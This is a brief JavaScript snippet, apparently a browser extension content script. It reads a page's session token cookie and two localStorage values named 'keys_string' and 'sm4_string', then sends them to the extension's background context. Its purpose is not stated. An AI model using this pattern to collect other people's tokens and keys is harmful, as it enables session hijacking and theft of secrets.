
const cookie = document.cookie.split(';')
const cookieObj = {}
cookie.forEach(item => {
  const keys = item.split('=')
  cookieObj[keys[0]] = keys[1];
})

chrome.runtime.sendMessage(
  { 
    type: 'key',
    data: { 
      keys_string: localStorage.getItem('keys_string'),
      sm4_string: localStorage.getItem('sm4_string'),
      token: cookieObj.token
    } 
  }, 
  () => {}
);